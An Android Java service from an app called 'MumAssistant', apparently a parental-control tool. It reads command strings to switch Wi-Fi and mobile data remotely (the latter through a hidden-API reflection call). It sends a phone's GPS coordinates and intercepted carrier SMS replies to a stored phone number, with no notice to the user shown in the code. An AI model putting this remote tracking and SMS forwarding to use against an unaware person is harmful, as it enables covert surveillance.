package com.android.mumassistant.control;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import com.android.mumassistant.R;
import com.android.mumassistant.Utils;
import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;

import android.app.AlertDialog;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.WindowManager;

public class SnifferService extends Service{
	
	private static final String TAG = "SnifferService";
	private static final String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";

	private boolean mWifiValue; 
	private boolean mDataValue;
	private boolean mPaymentValue;
	private boolean mLocationtValue;
	private boolean mShortcutValue;
	private String mOperatorCurrent = "";
	private LocationClient mLocationClient = null;

	private double mLatitude = 0;
	private double mLongitude = 0;

	private String BindTelnum = null;

	private location_thread mLocationThread = new location_thread();
	
	private class location_thread extends Thread{
		SmsManager smsManager;
		@Override
		public void run() {
			// TODO Auto-generated method stub
			super.run();
			Log.v(TAG,"location thread run");
			mLocationClient.start();
			mLocationClient.requestLocation();

			while((mLatitude == 0)&&(mLongitude == 0)){
				try {
					sleep(2000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
				if((mLatitude != 0)&&(mLongitude != 0)){
					String message = "**XY#"+"lat_"+mLatitude+"#"+"lon_"+mLongitude;
					if((!("0000").equals(BindTelnum))&&(null != message)){
						smsManager = SmsManager.getDefault();
						smsManager.sendTextMessage(BindTelnum, null, message, null, null);
					}
					
					mLocationClient.stop();
				}
			}
	}
	
	private BroadcastReceiver paymentlistener = new BroadcastReceiver() {

		@Override
		public void onReceive(Context arg0, Intent arg1) {
			// TODO Auto-generated method stub
			if("android.provider.Telephony.SMS_RECEIVED".equals(arg1.getAction())){
				Object[] pdus = (Object[]) arg1.getExtras().get("pdus");
				for (Object pdu : pdus) {
					SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
					String address = message.getOriginatingAddress();
					String content = message.getMessageBody();
					if(mOperatorCurrent.equals(address)&&(BindTelnum != null)){
						SmsManager smsManager;
						smsManager = SmsManager.getDefault();
						smsManager.sendTextMessage(BindTelnum, null, content, null, null);
					
					}
				}
			}
		}
	};
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		if(intent == null){
			return 0;
		}
		SharedPreferences shp = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
		BindTelnum = shp.getString("number_edit", "0000");		
		Bundle myBundel=intent.getExtras();
		String message = myBundel.getString("Message");
		
		
		if(null != message){
			String[] ss = message.split("#");
			for (int i = 0; i < ss.length; i++) {
				if(ss[i].indexOf(Utils.SSWIFITAG) >= 0){
					if((ss[i].substring(ss[i].length()-1)).equals("1")){
						mWifiValue = true;
					}else{
						mWifiValue = false;
					}
					
				}
				if(ss[i].indexOf(Utils.SSDATATAG) >= 0){
					if((ss[i].substring(ss[i].length()-1)).equals("1")){
						mDataValue = true;
					}else{
						mDataValue = false;
					}
					
				}
				if(ss[i].indexOf(Utils.SSPAYTAG) >= 0){
					if((ss[i].substring(ss[i].length()-1)).equals("1")){
						mPaymentValue = true;
					}else{
						mPaymentValue = false;
					}
				}
				if(ss[i].indexOf(Utils.SSLOCALTAG) >= 0){
					if((ss[i].substring(ss[i].length()-1)).equals("1")){
						mLocationtValue = true;
					}else{
						mLocationtValue = false;
					}
				}
				if(ss[i].indexOf(Utils.SSHORTCUTTAG) >= 0){
					if((ss[i].substring(ss[i].length()-1)).equals("1")){
						mShortcutValue = true;
					}else{
						mShortcutValue = false;
					}
				}
			}
			
			setMobileDataStatus(getApplicationContext(),mDataValue);
			setWifi(mWifiValue);
			SendPaymentOfQueryMessage(mPaymentValue);
			getLocation(mLocationtValue);
			if(mShortcutValue){
				ShortCutService ShortCutThread = new ShortCutService();
				ShortCutThread.ContextIsOk(getApplicationContext());
				ShortCutThread.start();
			}
			//this.stopSelf();
		}
		return super.onStartCommand(intent, flags, startId);
	}
	
	
	private void setMobileDataStatus(Context context, boolean enabled){
		ConnectivityManager conMgr = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE); 	
		// ConnectivityManager类  
		Class<?> conMgrClass = null;
		// ConnectivityManager类中的字段
		Field iConMgrField = null;
		// IConnectivityManager类的引用
		Object iConMgr = null;
		// IConnectivityManager类
		Class<?> iConMgrClass = null;
		// setMobileDataEnabled方法
		Method setMobileDataEnabledMethod = null;
		
		
		 try {  
             // 取得ConnectivityManager类  
             conMgrClass = Class.forName(conMgr.getClass().getName());  
             // 取得ConnectivityManager类中的对象Mservice  
             iConMgrField = conMgrClass.getDeclaredField("mService");  
             // 设置mService可访问  
             iConMgrField.setAccessible(true);  
             // 取得mService的实例化类IConnectivityManager  
             iConMgr = iConMgrField.get(conMgr);  
             // 取得IConnectivityManager类  
             iConMgrClass = Class.forName(iConMgr.getClass().getName());  
             // 取得IConnectivityManager类中的setMobileDataEnabled(boolean)方法  
             setMobileDataEnabledMethod = iConMgrClass.getDeclaredMethod(  
                     "setMobileDataEnabled", Boolean.TYPE);  
             // 设置setMobileDataEnabled方法是否可访问  
             setMobileDataEnabledMethod.setAccessible(true);  
             // 调用setMobileDataEnabled方法  
             setMobileDataEnabledMethod.invoke(iConMgr, enabled);  
       } catch (ClassNotFoundException e) {  
             e.printStackTrace();  
       } catch (NoSuchFieldException e) {  
            e.printStackTrace();  
       } catch (SecurityException e) {  
            e.printStackTrace();  
       } catch (NoSuchMethodException e) {  
             e.printStackTrace();  
       } catch (IllegalArgumentException e) {  
             e.printStackTrace();  
       } catch (IllegalAccessException e) {  
            e.printStackTrace();  
       } catch (InvocationTargetException e) {  
            e.printStackTrace();  
       }  

	}
	
	private void setWifi(boolean isEnable) {
		WifiManager mWm = (WifiManager) this.getSystemService(Context.WIFI_SERVICE); 
		if (isEnable) {
			if (!mWm.isWifiEnabled()) { 
				mWm.setWifiEnabled(true);
			}
		}else{
			 if (mWm.isWifiEnabled()) {
				 mWm.setWifiEnabled(false);
			 }
		}
	}
	
	private void SendPaymentOfQueryMessage(boolean isEnable){
		if(isEnable == false){
			return;
		}
			
		SmsManager smsManager = SmsManager.getDefault();
		TelephonyManager telManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		String imsi = telManager.getSubscriberId();
		String message = "YE" ;
		
		if(imsi!=null){
			if(imsi.startsWith("46000") || imsi.startsWith("46002")){
				//移动
				mOperatorCurrent = "10086";

			}else if(imsi.startsWith("46001")){
				//联通
				mOperatorCurrent = "10010";

			}else if(imsi.startsWith("46003")){
				//电信
				mOperatorCurrent = "10001";

			}
		}
		if((mOperatorCurrent.length() > 0)&&(message.length() > 0)){
			smsManager.sendTextMessage(mOperatorCurrent, null, message , null, null);
			 IntentFilter filter = new IntentFilter();
			 filter.addAction(SMS_ACTION);
			 this.registerReceiver(paymentlistener, filter);
		}
	}
	private void getLocation(boolean Enabled){
		if(Enabled == false){
			return ;
		}
		mLocationClient = new LocationClient(getApplicationContext());
		LocationClientOption option = new LocationClientOption();
		option.setOpenGps(true);
		option.setCoorType("bd09ll");
		option.setPriority(LocationClientOption.NetWorkFirst);
		option.setProdName("MumAssistant");
		option.setScanSpan(5000);
		option.setServiceName("com.baidu.location.service");
		mLocationClient.setLocOption(option);

		mLocationClient.registerLocationListener(new BDLocationListener() {
			

			@Override
			public void onReceiveLocation(BDLocation location) {
				// TODO Auto-generated method stub
				if (location == null) {
					Log.v(TAG,"BD location null");
					return;
				}
				mLatitude = location.getLatitude();
				mLongitude = location.getLongitude();

			}

			@Override
			public void onReceivePoi(BDLocation arg0) {
				// TODO Auto-generated method stub
				
			}
		
		});
		mLocationThread.start();
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		try{
			this.unregisterReceiver(paymentlistener);
		}catch(Exception e){
			
		}
		if((mLocationClient != null)&&(mLocationClient.isStarted())){
			mLocationClient.stop();
		}
	}

	
}